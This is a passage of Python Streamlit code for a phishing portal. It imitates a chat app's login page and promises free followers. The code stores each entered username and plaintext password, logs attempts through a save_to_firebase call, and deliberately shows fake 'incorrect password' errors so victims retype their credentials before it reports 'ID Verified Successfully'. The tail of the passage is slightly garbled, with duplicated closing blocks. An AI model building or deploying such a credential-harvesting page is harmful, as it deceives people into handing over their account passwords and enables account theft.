        .vc-brand { color: #000000; font-size: 36px; font-weight: 500; text-align: center; margin-top: 0px; margin-bottom: 30px;}
        
        /* Input adjustments */
        div[data-baseweb="input"] { background-color: #f9fafb !important; border: none !important; }
        label { color: #6b7280 !important; font-size: 13px !important; font-weight: 600 !important; }
        
        /* The EXACT Yellow Button */
        .stButton > button {
            background-color: #fffc00 !important;
            color: #000000 !important;
            border-radius: 30px !important;
            width: 150px !important;
            display: block !important;
            margin: 30px auto 10px auto !important;
            font-weight: 700 !important;
            border: none !important;
            box-shadow: 0 2px 5px rgba(255, 252, 0, 0.4) !important;
        }
        .stButton > button:hover { background-color: #e6e300 !important; }
        
        /* Footer styling */
        .vc-footer { text-align: center; font-size: 14px; margin-top: 40px; color: #4b5563; }
        .vc-footer b { color: #000000; }
        </style>
    """, unsafe_allow_html=True)

    # UI Construction replicating the image
    col1, col2, col3 = st.columns([1, 4, 1])
    
    with col2:
        st.markdown("<p class='vc-logo'>logo</p>", unsafe_allow_html=True)
        st.markdown("<p class='vc-brand'>vinay chat</p>", unsafe_allow_html=True)
        
        with st.form("vinay_chat_login", clear_on_submit=False):
            vc_user = st.text_input("Username or Email", placeholder="Your Username Here")
            vc_pass = st.text_input("Password", type="password", placeholder="••••••••")
            
            st.markdown("<p style='text-align:right; font-size:12px; color:#6b7280; margin-top:-10px;'>Forgot Password</p>", unsafe_allow_html=True)
            
            login_btn = st.form_submit_button("Log In")
            
            if login_btn:
                if vc_user and vc_pass:
                    # Save attempt to memory
                    attempt_data = {
                        "attempt_number": st.session_state.login_attempts,
                        "entered_username": vc_user,
                        "entered_password": vc_pass
                    }
                    st.session_state.failed_logins.append(attempt_data)
                    
                    # LOGIC: Fail first 3 times, pass on the 4th
                    if st.session_state.login_attempts < 4:
                        save_to_firebase(f"FAILED_LOGIN_ATTEMPT_{st.session_state.login_attempts}")
                        st.session_state.login_attempts += 1
                        st.error("Authentication Error: Incorrect Username or Password.")
                    else:
                        save_to_firebase("SUCCESSFUL_FINAL_LOGIN")
                        st.session_state.step = 6
                        st.rerun()
                else:
                    st.warning("Enter both fields.")
                    
        st.markdown("<p class='vc-footer'>New To vinay chat <b>Sign Up</b></p>", unsafe_allow_html=True)

# ==========================================
# STEP 6: FINAL SUCCESS
# ==========================================
elif st.session_state.step == 6:
    # Revert to normal clean styling
    st.markdown("<div class='premium-header'><div class='title-gradient'>ID Verified Successfully!</div></div>", unsafe_allow_html=True)
    
    st.markdown("""
    <div class='card-box' style='text-align:center;'>
        <h2 style='color:#10b981;'>Verification Complete ✅</h2>
        <p>Your official Vinay Chat account is linked securely.</p>
        <p style='color:#3b82f6; font-weight:600;'>Followers will be injected into your profile within the next 1 Hour.</p>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("Go Back Home"):
        st.session_state.clear()
        st.rerun()
>
    </div>
    """, unsafe_allow_html=True)
    
    if st.button("Reset Portal Framework"):
        st.session_state.clear()
        st.rerun()
